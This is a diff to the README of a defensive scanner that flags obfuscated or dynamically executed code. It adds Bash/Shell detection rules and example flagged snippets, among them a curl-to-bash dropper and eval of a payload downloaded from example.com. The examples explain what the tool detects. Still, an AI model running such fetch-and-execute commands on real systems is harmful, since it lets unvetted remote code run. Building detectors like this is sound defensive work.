@@ -1,6 +1,6 @@
 # disclude
 
-Scan a (C, Rust, Python, Typescript) source tree for signs that code is hiding its intent from a human reader: Unicode attacks, encoded payloads, dynamic execution patterns, and build-time escape hatches. This is not a general purpose vulnerability scanner. This is a tool to surface the techniques used to make malicious code look benign on review.
+Scan a (C, Rust, Python, TypeScript, Bash/Shell) source tree for signs that code is hiding its intent from a human reader: Unicode attacks, encoded payloads, dynamic execution patterns, and build-time escape hatches. This is not a general purpose vulnerability scanner. This is a tool to surface the techniques used to make malicious code look benign on review.
 
 Implemented in fast, multi-threaded Rust. Useful for humans, useful for AI agents: find areas for examination faster (and cheaper) than full code scans.
 
@@ -23,7 +23,7 @@ disclude scan <path> [options]
 | `--severity` | `warn` | Minimum severity to report: `info`, `warn`, `critical` |
 | `--exit-code` | off | Exit 1 if any findings at or above threshold |
 | `--diff <ref>` | — | Annotate findings introduced since a git ref (`main`, a tag, a SHA) |
-| `--lang <lang>` | auto | Override language detection: `python`, `rust`, `ts`, `js`, `c` |
+| `--lang <lang>` | auto | Override language detection: `python`, `rust`, `ts`, `js`, `c`, `bash`/`sh`/`shell` |
 | `--ignore <file>` | — | Additional ignore file (gitignore syntax) |
 | `--no-raw` | — | Skip raw byte analysis |
 | `--no-token` | — | Skip token-level analysis |
@@ -51,6 +51,7 @@ Language is detected from file extension or shebang line.
 
 | Language | Extensions | Shebang |
 |---|---|---|
+| Bash/Shell | `.sh`, `.bash`, `.bsh`, `.ksh`, `.zsh` | `bash`, `sh`, `ksh`, `zsh` |
 | C | `.c`, `.h` | — |
 | Python | `.py`, `.pyi` | `python` |
 | Rust | `.rs` | — |
@@ -143,6 +144,33 @@ AST pass; tree-sitter.
 | `dynamic-execution` | critical / warn / info | `eval()`, `new Function()`, or `setTimeout`/`setInterval` called with a string argument (critical/warn). `atob(x)` — base64 decode at runtime (warn); the first step of the classic supply-chain pattern: store C2 URL or payload as a base64 literal, decode it, then fetch or exec. `btoa(x)` — base64 encode at runtime (info); used in exfiltration patterns. |
 | `dynamic-import` | warn | `require(expr)` where `expr` is not a string literal, or `` import(`...${expr}...`) `` template. |
 | `dynamic-attribute` | warn | `process.binding(name)` — Node.js internal binding escape hatch, reaches C++ internals not exposed through the public API. |
+
+### Dynamic execution — Bash/Shell
+
+AST pass; tree-sitter.
+
+| Signal | Severity | Description |
+|---|---|---|
+| `dynamic-execution` | critical / warn | `eval` called with a dynamic argument — variable expansion (`eval "$VAR"`), command substitution (`eval $(cmd)`), or a word containing variable references (critical). `eval` called with a plain string literal (warn). Also fires when `exec` is called with a variable as the binary path (`exec $cmd`), since the executed binary is unknown statically (critical). |
+| `dynamic-import` | warn | `source $path` or `. $path` where the path contains a variable — the sourced file is determined at runtime. |
+| `dynamic-execution` (pipeline) | warn | A pipeline ending with `bash`, `sh`, `ksh`, or `zsh` — the classic "pipe to shell" dropper pattern (`curl … \| bash`). Downloads and immediately executes arbitrary code without inspection. |
+
+**Examples:**
+
+```bash
+# CRITICAL — dynamic value reaches eval
+PAYLOAD=$(curl -s https://example.com/update.sh)
+eval "$PAYLOAD"
+
+# CRITICAL — exec with variable binary path
+exec $USER_SUPPLIED_BIN
+
+# WARN — source with variable path
+source $CONFIG_DIR/init.sh
+
+# WARN — classic pipe-to-shell dropper
+curl -fsSL https://example.com/install.sh | bash
+```
 
 ### Dynamic execution — C
 
